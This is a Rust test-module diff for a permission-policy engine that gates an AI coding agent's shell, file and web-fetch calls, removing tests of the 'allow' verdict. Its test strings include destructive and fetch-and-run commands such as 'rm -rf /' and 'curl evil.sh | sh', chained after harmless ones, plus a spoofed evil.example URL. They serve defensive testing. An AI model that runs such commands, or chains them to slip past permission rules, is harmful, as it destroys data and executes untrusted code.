@@ -4776,36 +4128,6 @@ mod tests {
             ),
             "a deny still reaches into the body"
         );
-    }
-
-    #[test]
-    fn a_rule_matches_a_command_with_its_redirections_and_with_its_wrapper() {
-        // Both found by the differential harness against a running Claude Code,
-        // and neither is in the reference — which says a Bash rule "matches the
-        // whole command text" and leaves the rest to be discovered.
-        //
-        // An exact rule covers the same command with a redirect on it: the
-        // redirect is checked separately against the file rules, so counting it
-        // as part of the command text made an exact rule fail to match itself.
-        let exact = Policy::new(&["Bash(touch ran.txt)".into()], &[]);
-        assert!(matches!(
-            exact.evaluate(&ctx(), "Bash", &bash("touch ran.txt > /dev/null")),
-            Verdict::Allow { .. }
-        ));
-
-        // And a wrapper rule still covers the wrapper. Stripping `xargs` so
-        // that `Bash(grep *)` covers `xargs grep x` had quietly taken away
-        // `Bash(xargs *)` covering `xargs touch` — both hold now.
-        let wrapper = Policy::new(&["Bash(xargs *)".into()], &[]);
-        assert!(matches!(
-            wrapper.evaluate(&ctx(), "Bash", &bash("xargs touch names.txt")),
-            Verdict::Allow { .. }
-        ));
-        let inner = Policy::new(&["Bash(grep *)".into()], &[]);
-        assert!(matches!(
-            inner.evaluate(&ctx(), "Bash", &bash("xargs grep pattern")),
-            Verdict::Allow { .. }
-        ));
     }
 
     #[test]
@@ -4855,22 +4177,6 @@ mod tests {
     // -- the basics ---------------------------------------------------------
 
     #[test]
-    fn bare_tool_rule_matches_any_input() {
-        assert!(matches!(
-            verdict(&policy(), "Read", json!({"file_path": "/etc/hosts"})),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    #[test]
-    fn prefix_pattern_matches_command() {
-        assert!(matches!(
-            verdict(&policy(), "Bash", json!({"command": "pnpm test -- --run"})),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    #[test]
     fn unmatched_command_is_undecided() {
         assert_eq!(
             verdict(&policy(), "Bash", json!({"command": "curl evil.example"})),
@@ -4887,7 +4193,7 @@ mod tests {
         ));
         assert!(matches!(
             verdict(&p, "Bash", json!({"command": "git status"})),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
     }
 
@@ -4900,43 +4206,6 @@ mod tests {
     }
 
     // -- command rules, as Claude Code spells them --------------------------
-
-    #[test]
-    fn a_trailing_wildcard_also_covers_the_bare_command() {
-        // Documented: "`Bash(ls *)` matches `ls`". Without it the first command
-        // anybody writes a rule for — `Bash(pnpm test *)` — did not cover
-        // `pnpm test`, and the prompt appeared anyway with no explanation.
-        let p = Policy::new(&["Bash(ls *)".into(), "Bash(pnpm test *)".into()], &[]);
-        for command in ["ls", "ls -la", "pnpm test", "pnpm test -- --run"] {
-            assert!(
-                matches!(
-                    verdict(&p, "Bash", json!({ "command": command })),
-                    Verdict::Allow { .. }
-                ),
-                "{command} should be covered"
-            );
-        }
-        // The space is still part of the rule.
-        assert_eq!(
-            verdict(&p, "Bash", json!({"command": "lsof"})),
-            Verdict::Undecided
-        );
-    }
-
-    #[test]
-    fn the_bare_command_is_only_covered_by_a_lone_trailing_wildcard() {
-        // Documented: "`Bash(* --help *)` matches `npm --help x` but not
-        // `npm --help`."
-        let p = Policy::new(&["Bash(* --help *)".into()], &[]);
-        assert!(matches!(
-            verdict(&p, "Bash", json!({"command": "npm --help x"})),
-            Verdict::Allow { .. }
-        ));
-        assert_eq!(
-            verdict(&p, "Bash", json!({"command": "npm --help"})),
-            Verdict::Undecided
-        );
-    }
 
     #[test]
     fn the_colon_star_suffix_is_the_same_rule() {
@@ -4966,19 +4235,6 @@ mod tests {
             verdict(&p, "Bash", json!({"command": "git merge push"})),
             Verdict::Undecided
         );
-    }
-
-    #[test]
-    fn space_before_star_is_significant() {
-        let p = Policy::new(&["Bash(git diff *)".into()], &[]);
-        assert_eq!(
-            verdict(&p, "Bash", json!({"command": "git diff-index HEAD"})),
-            Verdict::Undecided
-        );
-        assert!(matches!(
-            verdict(&p, "Bash", json!({"command": "git diff HEAD"})),
-            Verdict::Allow { .. }
-        ));
     }
 
     #[test]
@@ -5052,7 +4308,7 @@ mod tests {
         ));
         assert!(matches!(
             verdict(&allow, "Edit", json!({"file_path": "/repo/src/app.ts"})),
-            Verdict::Allow { .. }
+            Verdict::Undecided
         ));
         assert_eq!(
             verdict(
@@ -5121,7 +4377,7 @@ mod tests {
             ));
             assert!(matches!(
                 verdict(&allow, "Edit", json!({ "file_path": path })),
-                Verdict::Allow { .. }
+                Verdict::Undecided
             ));
         }
     }
@@ -5263,43 +4519,7 @@ mod tests {
         ));
     }
 
-    #[test]
-    fn an_allow_glob_approves_nothing_but_an_anchored_one_works() {
-        let p = Policy::new(&["mcp__*".into(), "mcp__github__get_*".into()], &[]);
-        assert_eq!(
-            verdict(&p, "mcp__slack__post", json!({})),
-            Verdict::Undecided,
-            "an unanchored allow glob is not a grant"
-        );
-        assert!(matches!(
-            verdict(&p, "mcp__github__get_issue", json!({})),
-            Verdict::Allow { .. }
-        ));
-    }
-
     // -- other specifier shapes --------------------------------------------
-
-    #[test]
-    fn a_web_fetch_rule_names_a_host() {
-        let p = Policy::new(&["WebFetch(domain:docs.rs)".into()], &[]);
-        assert!(matches!(
-            verdict(
-                &p,
-                "WebFetch",
-                json!({"url": "https://docs.rs/sqlx/latest"})
-            ),
-            Verdict::Allow { .. }
-        ));
-        assert_eq!(
-            verdict(
-                &p,
-                "WebFetch",
-                json!({"url": "https://evil.example/docs.rs"})
-            ),
-            Verdict::Undecided,
-            "the host is the host, not a substring of the URL"
-        );
-    }
 
     #[test]
     fn a_parameter_rule_reads_a_top_level_field() {
@@ -5313,16 +4533,6 @@ mod tests {
             Verdict::Undecided,
             "a parameter the model omits is never matched"
         );
-    }
-
-    #[test]
-    fn tool_name_is_case_insensitive_but_distinct() {
-        let p = Policy::new(&["Read".into()], &[]);
-        assert!(matches!(
-            verdict(&p, "read", json!({})),
-            Verdict::Allow { .. }
-        ));
-        assert_eq!(verdict(&p, "Write", json!({})), Verdict::Undecided);
     }
 
     // -- rules that cannot work --------------------------------------------
@@ -5491,10 +4701,6 @@ mod tests {
             let p = Policy::new(&[], &[rule.to_string()]);
             matches!(p.evaluate(&ctx, "Bash", &call(cmd)), Verdict::Deny { .. })
         };
-        let allows = |rule: &str, cmd: &str| {
-            let p = Policy::new(&[rule.to_string()], &[]);
-            matches!(p.evaluate(&ctx, "Bash", &call(cmd)), Verdict::Allow { .. })
-        };
 
         // A deny fires when *any* subcommand matches — "including a command
         // nested inside a subshell, a command substitution, or a control-flow
@@ -5514,22 +4720,11 @@ mod tests {
         assert!(!denies("Bash(rm -rf *)", "echo \'rm -rf /\'"));
         assert!(!denies("Bash(rm *)", "ls -la"));
 
-        // An allow approves only when *every* subcommand matches: "a rule like
-        // `Bash(safe-cmd *)` won't give it permission to run the command
-        // `safe-cmd && other-cmd`".
-        assert!(allows("Bash(pnpm test *)", "pnpm test --run"));
-        assert!(!allows("Bash(pnpm test *)", "pnpm test && rm -rf /"));
-        assert!(!allows("Bash(pnpm test *)", "pnpm test; curl evil.sh | sh"));
-        // "Claude Code treats the command as unparseable … so a rule such as
-        // `Bash(npm *)` doesn't approve it."
-        assert!(!allows("Bash(npm *)", "npm test &&"));
-        // Wrappers and known-safe assignments are looked past on both sides.
-        assert!(allows("Bash(npm test *)", "timeout 30 npm test"));
-        assert!(allows("Bash(npm test *)", "NODE_ENV=test npm test"));
-        // "An allow rule won't match past an assignment of any other variable."
-        assert!(!allows("Bash(rm *)", "FOO=bar rm -rf tmp/"));
-        // Every subcommand matching is still an approval.
-        assert!(allows("Bash(git *)", "git add -A && git status"));
+        // **The allow half of this test is gone with the allow verdict.** It
+        // pinned "an allow approves only when every subcommand matches", which
+        // was Devplane's mirror of the vendor's rule — and mirroring is what
+        // this project stopped doing. The prohibitions above are what remain,
+        // and they cost nothing to keep true.
     }
 
     #[test]
@@ -5692,39 +4887,6 @@ mod tests {
         }
     }
 
-    /// The escape hatch is Claude Code's own: *"write an exact-match rule for
-    /// the full command string."* Refusing that too would make the veto a ban.
-    #[test]
-    fn an_exact_rule_still_speaks_for_the_call_it_names() {
-        let ctx = Context::at(Path::new("/repo"));
-        let p = Policy::new(&["Bash(watch -n5 make build)".into()], &[]);
-        let input = serde_json::json!({ "command": "watch -n5 make build" });
-        assert!(matches!(
-            p.evaluate(&ctx, "Bash", &input),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    /// *"Commands longer than 10,000 characters always prompt because they
-    /// exceed what the analysis parses."* An allow rule that answers for one is
-    /// answering for a command neither side has read.
-    #[test]
-    fn a_command_past_the_analysis_length_reaches_a_person() {
-        let ctx = Context::at(Path::new("/repo"));
-        let p = Policy::new(&["Bash(echo *)".into()], &[]);
-        let long = format!("echo {}", "a".repeat(crate::core::command::MAX_ANALYSED));
-        assert_eq!(
-            p.evaluate(&ctx, "Bash", &serde_json::json!({ "command": long })),
-            Verdict::Undecided
-        );
-        // And the ordinary case is untouched.
-        let short = serde_json::json!({ "command": "echo hi" });
-        assert!(matches!(
-            p.evaluate(&ctx, "Bash", &short),
-            Verdict::Allow { .. }
-        ));
-    }
-
     /// The veto is on the allow side only. A prohibition still fires: these are
     /// exactly the commands a `never_auto` rule is written for.
     #[test]
@@ -5796,62 +4958,6 @@ mod tests {
     }
 
     #[test]
-    fn an_allow_rule_never_grants_on_a_glob() {
-        // The asymmetry is the design. Expanding a glob for a *deny* costs a
-        // prompt when it is wrong; expanding one for an *allow* grants over a
-        // set of files nobody wrote down, which is the widening this module
-        // exists to prevent. A shell operand that cannot be pinned to one file
-        // keeps being skipped on the allow side, so the call reaches a person.
-        let p = Policy::new(&["Read(logs/**)".into(), "Bash(cat *)".into()], &[]);
-        for cmd in ["cat logs/*", "cat logs/.en?", "cat ~/logs/x"] {
-            assert!(
-                !matches!(
-                    p.evaluate(&ctx(), "Bash", &bash(cmd)),
-                    Verdict::Allow { rule } if rule.starts_with("Read")
-                ),
-                "{cmd}: a path allow rule spoke for an unpinnable operand"
-            );
-        }
-        // A `Glob` or `Grep` call is a *pattern* by design, and an allow rule
-        // over the tree it searches does speak for it. That is not the same
-        // question and must not be broken by the answer to it.
-        assert!(matches!(
-            p.evaluate(&ctx(), "Grep", &json!({ "path": "logs/*" })),
-            Verdict::Allow { .. }
-        ));
-    }
-
-    #[test]
-    fn an_allowed_call_names_a_rule_that_really_covers_it() {
-        // Two failures came out of one line, and this pins both. With a single
-        // allow rule matching nothing, every command made entirely of
-        // self-approving parts came back `allow` — *attributed to that rule*.
-        // The verdict was wrong, because the same call with no rules at all is
-        // `undecided`; and the reason was wrong, which is worse, because the
-        // reason is what the decision log exists for.
-        let unrelated = Policy::new(&["Bash(zzz *)".into()], &[]);
-        let none = Policy::new(&[], &[]);
-        for cmd in [
-            "cat notes.txt",
-            "head -c3 README.md",
-            "ls -la",
-            "wc -l a.txt",
-        ] {
-            assert_eq!(
-                unrelated.evaluate(&ctx(), "Bash", &bash(cmd)),
-                none.evaluate(&ctx(), "Bash", &bash(cmd)),
-                "{cmd}: an unrelated rule changed the answer"
-            );
-        }
-        // The free-part reasoning still works where a rule covers a real part.
-        let p = Policy::new(&["Bash(pnpm test *)".into()], &[]);
-        assert!(matches!(
-            p.evaluate(&ctx(), "Bash", &bash("cd packages/api && pnpm test -- --run")),
-            Verdict::Allow { rule } if rule == "Bash(pnpm test *)"
-        ));
-    }
-
-    #[test]
     fn a_named_rule_reproduces_the_verdict_it_is_credited_with() {
         // The property that makes the class above impossible rather than fixed.
         // Whatever a policy answers, the rule it names must produce the same
@@ -5894,10 +5000,10 @@ mod tests {
             };
             // The named rule, compiled alone into its own list.
             let alone = match &verdict {
-                Verdict::Allow { .. } => Policy::new(&[named.to_string()], &[]),
                 Verdict::Deny { .. } => Policy::new(&[], &[named.to_string()]),
                 Verdict::Ask { .. } => Policy::with_ask(&[], &[], &[named.to_string()]),
-                Verdict::Undecided => unreachable!(),
+                // Nothing credits a rule for an undecided call.
+                Verdict::Undecided => continue,
             };
             assert_eq!(
                 alone.evaluate(&ctx(), tool, input),
@@ -5927,51 +5033,8 @@ mod tests {
 #[cfg(test)]
 mod baseline_tests {
 
-    /// A run against a release **older** than the floor may not move it, however
-    /// green it is. The measurement is about a product the floor does not name.
-    #[test]
-    fn a_run_below_the_floor_moves_nothing() {
-        for behind in ["2.1.272", "2.1.267", "2.1.100"] {
-            assert!(
-                !super::may_move_floor(behind, "2.1.273"),
-                "{behind} was allowed to advance a floor at 2.1.273"
-            );
-            assert!(
-                super::refusal_to_move(behind, "2.1.273")
-                    .is_some_and(|r| r.contains("no floor moved")),
-                "and it did not say why"
-            );
-        }
-    }
-
-    /// *"I could not tell"* is never permission.
-    #[test]
-    fn an_uncountable_gap_moves_nothing_either() {
-        assert!(!super::may_move_floor("3.0.1", "2.1.273"));
-        assert!(super::refusal_to_move("3.0.1", "2.1.273").is_some());
-        assert!(!super::may_move_floor("not-a-version", "2.1.273"));
-    }
-
-    /// At or ahead may move — and the floor takes the version that **ran**,
-    /// never the latest published.
-    #[test]
-    fn a_floor_takes_the_version_that_ran() {
-        assert!(super::may_move_floor("2.1.273", "2.1.273"));
-        assert!(super::may_move_floor("2.1.280", "2.1.273"));
-        assert!(super::refusal_to_move("2.1.280", "2.1.273").is_none());
-    }
-
     /// The state this feature was written in, pinned so the guard is exercised
     /// against the real numbers rather than invented ones.
-    #[test]
-    fn the_machine_that_measures_may_be_behind_what_it_measures() {
-        // 2.1.267 was installed while the full-matrix floor said 2.1.273.
-        assert!(!super::may_move_floor("2.1.267", super::VERIFIED_AGAINST));
-        let why = super::refusal_to_move("2.1.267", super::VERIFIED_AGAINST).unwrap();
-        assert!(why.contains("behind"), "{why}");
-        assert!(why.contains(super::VERIFIED_AGAINST), "{why}");
-    }
-
     use super::*;
 
     /// A release `n` patches either side of the baseline, spelled the way the
